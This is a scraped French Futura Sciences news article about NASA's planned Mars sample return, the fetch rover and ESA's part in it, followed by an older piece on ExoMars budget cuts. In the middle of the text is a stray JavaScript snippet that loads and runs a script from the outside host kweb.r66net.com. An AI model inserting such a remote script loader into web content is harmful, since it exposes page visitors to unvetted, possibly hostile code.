{"title": "Echantillons martiens : la Nasa veut en ramener sur Terre d'ici 2031", "newspaper": "Futura Sciences", "author": ["Remy Decourt"], "date_publi": "2017-09-06", "content": "Grande priorite de l'exploration de Mars, le retour d'echantillons coute cher. La Nasa vient de presenter une solution  low cost , qui s'appuierait sur les satellites en service autour de Mars, malgre leur age avance. Avec l'aide de l'Agence spatiale europeenne, la mission serait envisageable pour les fenetres de tir de 2026 et 2028. Francis Rocard, du Cnes, nous explique les opportunites et les difficultes de ce projet.  Ce qu'il faut retenir La Nasa revise a la baisse sa mission de retour d'echantillons martiens en supprimant l'orbiteur Nemo. Le rover de la mission Mars 2020 devrait realiser les prelevements. Lance en 2026, un autre vehicule ira se poser a proximite et recuperera les echantillons pour les apporter a un petit lanceur a poudre qui s'installera en orbite. En 2028, un engin quittera la Terre et accostera l'orbiteur pour recuperer le kilogramme de matiere martienne et assurer le trajet de retour. L'Agence spatiale europeenne devrait participer a cette mission selon des modalites qui restent a etablir. En prevision de difficultes financieres futures, Thomas Zurbuchen, administrateur associe de la Nasa pour la science, a presente une legere variante de la mission de retour d'echantillons martiens que planifie actuellement la Nasa entre la fin des annees 2020 et le debut de la decennie 2030. Il propose d'utiliser la  fenetre  de tir de 2026 pour poser sur Mars un vehicule charge de recuperer les echantillons prealablement preleves par  Mars 2020  (le  << fetch  rover  >> , litteralement rover recuperateur) et un engin pour le retour vers la  Terre , le MAV ( Mars Ascent Vehicle ). Par rapport au scenario initial,  << le deroulement de la mission ne change pas vraiment >>  nous explique  Francis Rocard , le responsable des programmes d'exploration du  Systeme solaire  au Cnes. Pour reduire les couts, l'idee est d'abandonner l' orbiter  Nemo (pour  Next Generation Mars Orbiter ), dont le lancement etait prevu en 2022. Ce satellite devait relayer les telecommunications, tester les techniques a mettre en oeuvre et assurer le support de cette mission de retour d'echantillons. L'idee de Zurbuchen est de continuer d'utiliser les satellites Maven et MRO, de la Nasa, bien qu'ils aient tous les deux depasse leur duree de vie initiale, et de s'appuyer egalement sur  << le  TGO  de l' Agence spatiale europeenne , qui dispose des instruments necessaires pour communiquer avec les missions de la Nasa sur Mars >> .   ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();   Le retour d'echantillons passerait par l'orbite martienne Faire l'economie du satellite de telecommunications Nemo n'a d'interet que si la Nasa envoie sur Mars au plus tard en 2026 le vehicule de retour et le rover recuperateur. Au-dela de cette date en effet, la vetuste des satellites Maven et MRO pourrait devenir redhibitoire, ce qui imposerait le financement et le lancement d'un nouveau satellite de relais de telecommunication. De quoi augmenter drastiquement les couts, tout le contraire de ce qui est recherche.  Le  << fetch rover >>  aura une seule fonction : recuperer le conteneur des echantillons collectes par Mars 2020 et le rapporter au MAV. Leger et rapide, ce rover sera similaire dans sa conception a Spirit et Opportunty, de la mission MER, mais son avionique sera, elle, heritee de Curiosity. Il devra parcourir au moins 12 km pour l'aller et le retour, soit un rayon d'action de 6 km, au rythme de 150 metres par jour. D'une duree de vie d'au moins 80 sols martiens, il n'embarquera pas d'instruments scientifiques. Quant aux echantillons martiens, le MAV ne les enverrait pas directement sur Terre mais en orbite martienne a quelque 600 km. Une autre sonde, lancee en 2028, se chargerait de les recuperer et les apporter sur Terre en 2031. Le saviez-vous ? Le rover de la mission Mars 2020, lance en 2020, donc, devra collecter entre 10 et 20 echantillons de plusieurs dizaines de grammes chacun, d'au moins 5 cm sur 1 cm, et les placer dans un tube scelle. La masse totale sera comprise entre 500 grammes et 1 kilogramme. Il s'y trouvera des roches, du regolithe, de la poussiere et du gaz. Leur analyse recherchera des traces de vie anciennes mais aussi des informations sur la geologie : datation des roches, differentiation croute-manteau, histoire du climat, origine des meteorites dites shergottites, nakhlites et chassignites, que l'on suppose provenir de Mars. Le conteneur a l'interieur duquel le rover Mars 2020 rangera les echantillons de sols qu'il aura preleves et qui seront recuperes plus tard par un autre rover. (c) Nasa, JPL                                L'Agence spatiale europeenne participera au retour vers la Terre Avant cette decision d'annuler NeMO, l'Agence spatiale europeenne et la Nasa discutaient d'un possible partenariat et deux options etaient a l'etude : soit l'ESA realise le rover recuperateur et l'orbiteur Mars 2028 qui ferait l'aller-retour entre Mars et la Terre avec les echantillons (un scenario tres ambitieux) ;  soit elle construit seulement le rover, et donc pas le vehicule du retour, mais contribuerait a la realisation de sous-systemes et du mecanisme de capture en orbite.  Malgre ce nouveau schema, il ne fait guere de doute que l'Agence spatiale europeenne participera a cette mission, meme  << si aucune decision officielle n'a ete prise >>  souligne Francis Rocard. L'ESA pourrait tres bien  << realiser la mission qui fera le rendez-vous et la capture en orbite martienne >> . C'est tout a fait  << dans les cordes de l'industrie spatiale europeenne >> . L'atterrisseur et le MAV,  << deux des trois gros points durs de la mission >> , seront du ressort des Americains. Le rendez-vous avec la sonde en orbite martienne est le troisieme point dur.  Initialement, la Nasa prevoyait la demonstration d'un rendez-vous et d'une capture d'un conteneur en orbite terrestre. Pour des raisons de couts, cette demonstration a ete annulee. Elle n'aura donc pas droit a l'erreur. Note : si les echantillons martiens sont attendus au mieux en 2031, le Cnes et la Jaxa devraient avoir rapporte des echantillons de Phobos en 2027 avec la  mission MMX . Pour en savoir plus ExoMars : le retour d'echantillons martiens repousse apres 2025 Article de Remy Decourt publie le 14/03/2012 Si le Congres des Etats-Unis ne restaure pas une partie du budget ampute par l'administration americaine, la Nasa n'aura pas d'autre choix que de se retirer des missions  ExoMars  2016 et ExoMars-C (ExoMars 2018) de l'Agence spatiale europeenne. Une decision qui rend peu probable le retour d'echantillons martiens avant 2030 et repousse encore plus loin la preparation de l'exploration humaine de Mars. Comme on le craignait, la proposition de budget de la Nasa presentee par l'administration americaine impose a l'agence spatiale de renoncer a sa participation au  projet europeen Exomars  et donne un coup d'arret au programme d' exploration de Mars . Sans la participation financiere americaine aux missions  ExoMars 2016  et ExoMars-C, la Nasa est donc contrainte d'abandonner le fameux << C >> d' ExoMars 2018 . Le << C >> signifie  catching  : il s'agit donc de collecter des echantillons et de les placer dans un conteneur qui sera recupere par un engin pour l'expedier sur Terre. La decision de renoncer pour le moment a une mission de type MSR ( Mars Sample Return ) est d'autant plus surprenante que le dernier rapport du Conseil national americain de la recherche (NRC, National Research Council) recommandait a la Nasa d'accorder la priorite a la mission Max-C, devenue ExoMars-C. La deuxieme priorite concernait l'exploration d'Europe, une des quatre  lunes  galileennes de  Jupiter , pour determiner si elle serait susceptible d'accueillir la  vie . Les observations les plus recentes laissent a penser qu' Europe  abrite un ocean a l'etat  liquide  sous sa  croute  de glace et donc potentiellement la vie. Projets ExoMars 2016 et 2018 tels que l'envisageaient l'Esa et la Nasa avant de les redefinir puis finalement de les remanier en raison du retrait americain et de l'arrivee des Russes. (c) Esa                               Qu'en sera-t-il des missions martiennes ? La Nasa ne peut evidemment pas abandonner l'exploration de Mars, qui occupe bon nombre de chercheurs aux Etats-Unis et represente un des moteurs de l'innovation americaine dans la technologie spatiale. La Planete rouge constitue un terrain d'exploration prioritaire car la surface martienne conserve la memoire de l'histoire des debuts du  Systeme solaire , sur une planete ou les conditions ont peut-etre ete semblables a celles de la Terre quand la vie a emerge. Actuellement, deux missions sont certaines d'atteindre Mars. MSL (Mars Science Laboratory) et son  rover Curiosity , lance en novembre 2011 et la  sonde Maven  dont le lancement est toujours prevu en 2013. Seule note optimiste si le budget est vote en l'etat, la Nasa pourrait financer une petite mission de 700 millions de dollars pour la fenetre de tir de 2018. A ce niveau de budget, il ne faut pas s'attendre a un atterrissage mais a une mission  orbitale . Pour s'en tenir aux recommandations du NRC, la Nasa pourrait utiliser cette mission pour preparer le retour d'echantillons comme le recommande le Mepag, le  Groupe d'analyse du programme d'exploration de Mars . L'idee serait de realiser un test de rendez-vous orbital et de capture d'un conteneur qui pourrait se faire autour de la Terre. Dans le cas du retour d'echantillons, la faisabilite du rendez-vous et de la capture n'est pas aujourd'hui demontree. L'autre scenario serait d'envoyer autour de Mars les instruments de l'ex- Trace Gas Orbiter  d'ExoMars 2016, notamment ceux dedies a l'etude du methane. Cela dit, l'avenir de la mission de  retour d'echantillons martiens  s'ecrit en pointilles. Comme nous l'explique Francis Rocard, le monsieur Mars du Cnes, les informations du Congres americain revelent que compte tenu des tensions sur le budget federal, le Congres << ne veut pas entendre parler de mission flagship [ NDLR  : d'exploration] apres le  telescope spatial James-Webb  >> qui a coute la bagatelle de 8,7 milliards de dollars, au vu des tensions budgetaires sur le budget federal. Or, une mission MSR est estimee a plus de 8,5 milliards de dollars. Au plus tot, elle pourrait avoir lieu << vers 2022-2024 en deux ou trois lancements si, bien evidemment, le Congres l'approuve >>. Survolez le pole nord de Mars                       Cette superbe animation simule un survol du pole nord de Mars grace aux images de la camera stereoscopique HRSC, installee sur Mars Express, en orbite autour de la Planete rouge depuis decembre 2003. La forme en spirale de la calotte glaciaire, oeuvre d'Eole, est entravee par l'enorme et sombre canyon Chasma Boreale, que l'on apercoit au milieu de la video.                                       ", "theme": "sciences"}